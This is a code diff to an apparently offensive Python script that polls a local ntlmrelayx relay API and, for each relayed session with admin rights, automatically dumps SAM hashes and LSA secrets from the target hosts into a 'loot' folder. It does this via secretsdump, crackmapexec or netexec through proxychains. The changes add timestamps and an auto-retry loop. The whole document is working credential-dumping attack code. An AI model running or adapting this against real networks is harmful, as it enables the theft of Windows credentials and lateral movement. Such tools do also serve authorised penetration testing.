@@ -5,8 +5,10 @@ except ImportError:
     from urllib2 import ProxyHandler, build_opener, Request
 
 import os, sys, json, subprocess
+from datetime import datetime
 import concurrent.futures
 import argparse
+import time
 
 color_RED = '\033[91m'
 color_GRE = '\033[92m'
@@ -22,6 +24,12 @@ red_exclm = "{}[!]{}".format(color_RED, color_reset)
 cwd = os.path.abspath(os.path.dirname(__file__))
 dumped_ips = []
 
+def timestamp():
+    today = datetime.now()
+    hour = today.strftime("%H")
+    ltime = time.localtime(time.time())
+    timestamp = '%s[%s-%s-%s %s:%s:%s]%s' % (color_BLU, str(ltime.tm_mon).zfill(2), str(ltime.tm_mday).zfill(2), str(ltime.tm_year).zfill(2), str(hour).zfill(2), str(ltime.tm_min).zfill(2), str(ltime.tm_sec).zfill(2), color_reset)
+    return timestamp
 
 def config_check():
     fail = 0
@@ -58,17 +66,20 @@ def mt_execute(username, ip, method, secretsdump_path, local_uname):
     print('{} Dumping {} via user {}'.format(gold_plus, ip, username))
 
     if method == 'secretsdump':
+        print('{} sudo proxychains python3 {} {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(timestamp(), secretsdump_path, username, ip, cwd, ip))
         os.system('sudo proxychains python3 {} {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(secretsdump_path, username, ip, cwd, ip))
+
     elif method == 'crackmapexec':
-        print('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
-        os.system('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
-        print('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+        print('{} sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(timestamp(), local_uname, ip, username.split('/')[1], username.split('/')[0]))
         os.system('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+        print('{} sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(timestamp(), local_uname, ip, username.split('/')[1], username.split('/')[0]))
+        os.system('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+
     elif method == 'netexec':
-        print('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
-        os.system('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
-        print('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+        print('{} sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --sam'.format(timestamp(), local_uname, ip, username.split('/')[1], username.split('/')[0]))
         os.system('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+        print('{} sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --lsa'.format(timestamp(), local_uname, ip, username.split('/')[1], username.split('/')[0]))
+        os.system('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
 
     with open('{}/dumped_ips'.format(cwd), 'a') as f:
         f.write(ip + '\n')
@@ -95,7 +106,6 @@ def check_uname():
     check_uname()
 
 if __name__ == '__main__':
-
     if os.geteuid() != 0:
         print("{} Must be run as sudo".format(red_exclm))
         sys.exit(1)
@@ -104,6 +114,7 @@ if __name__ == '__main__':
     parser.add_argument('-method', action='store', choices=['crackmapexec', 'secretsdump', 'netexec'], default='crackmapexec', help='Method used to dump LSA Secrets and SAM Default=crackmapexec')
     parser.add_argument('-sdp', action='store', help='Path to secretsdump.py file (only used if -method is secretsdump) Example -sdp /opt/impacket/examples/secretsdump.py')
     parser.add_argument('-threads', action='store', type=int, default=1, help='Number of threads to use Default=1 I recommend useing 1 as ntlmrelayx will sometimes lose a relay if you use more than 1 idk why')
+    parser.add_argument('-ar', action='store_true', help='Auto-retry when enabled runs constantly until ctrl+c is hit')
 
     options = parser.parse_args()
 
@@ -123,52 +134,63 @@ if __name__ == '__main__':
         print('Missing secretsdump.py')
         sys.exit(1)
 
-    if os.path.isfile('{}/dumped_ips'.format(cwd)):
-        with open('{}/dumped_ips'.format(cwd), 'r') as f:
-            dat = f.read()
-            dumped_ips = dat.split('\n')
+    while True:
+        try:
+            if os.path.isfile('{}/dumped_ips'.format(cwd)):
+                with open('{}/dumped_ips'.format(cwd), 'r') as f:
+                    dat = f.read()
+                    dumped_ips = dat.split('\n')
 
-    headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
-    url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
-    try:
-        proxy_handler = ProxyHandler({})
-        opener = build_opener(proxy_handler)
-        response = Request(url)
-        r = opener.open(response)
-        result = r.read()
+            headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
+            url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
+            try:
+                proxy_handler = ProxyHandler({})
+                opener = build_opener(proxy_handler)
+                response = Request(url)
+                r = opener.open(response)
+                result = r.read()
 
-        items = json.loads(result)
-    except Exception as e:
-        print("ERROR: %s" % str(e))
-    else:
-        if len(items) > 0:
+                items = json.loads(result)
+            except Exception as e:
+                print("ERROR: %s" % str(e))
+            else:
+                if len(items) > 0:
 
-            tmp = result.decode()
-            tmp = tmp.replace('[', '')
-            tmp = tmp.replace('"', '')
-            tmp = tmp.replace('\n', '')
-            tmp = tmp.split('],')
+                    tmp = result.decode()
+                    tmp = tmp.replace('[', '')
+                    tmp = tmp.replace('"', '')
+                    tmp = tmp.replace('\n', '')
+                    tmp = tmp.split('],')
 
-            # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
+                    # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
 
-            if os.path.isdir("{}/loot".format(cwd)) == False:
-                os.makedirs("{}/loot".format(cwd))
+                    if os.path.isdir("{}/loot".format(cwd)) == False:
+                        os.makedirs("{}/loot".format(cwd))
 
-            with concurrent.futures.ProcessPoolExecutor(max_workers=options.threads) as executor:  # multithreading yeahhhh
-                for item in tmp:
-                    dat = item.replace(']', '').split(',')
-                    if dat[3] == 'TRUE':
-                        if dat[1] not in dumped_ips:
-                            dumped_ips.append(dat[1])  # append the ip to dumped_ips to avoid dumping the same host twice
+                    with concurrent.futures.ProcessPoolExecutor(max_workers=options.threads) as executor:  # multithreading yeahhhh
+                        for item in tmp:
+                            dat = item.replace(']', '').split(',')
+                            if dat[3] == 'TRUE':
+                                if dat[1] not in dumped_ips:
+                                    dumped_ips.append(dat[1])  # append the ip to dumped_ips to avoid dumping the same host twice
 
-                            # lsa secrets and sam dump courtesy of secretsdump
-                            try:
-                                executor.submit(mt_execute, dat[2], dat[1], options.method, options.sdp, local_uname)
-                            except Exception as e:
-                                print(str(e))
-                                print('Error dumping secrets')
-                                continue
+                                    # lsa secrets and sam dump courtesy of secretsdump
+                                    try:
+                                        executor.submit(mt_execute, dat[2], dat[1], options.method, options.sdp, local_uname)
+                                    except Exception as e:
+                                        print(str(e))
+                                        print('Error dumping secrets')
+                                        continue
 
 
-        else:
-            print('No Relays Available!')
+                else:
+                    print('No Relays Available!')
+
+            if not options.ar:
+                break
+
+            time.sleep(5)
+        except KeyboardInterrupt:
+            print("\nCtrl+c detected: exiting")
+            sys.exit(0)
+            break
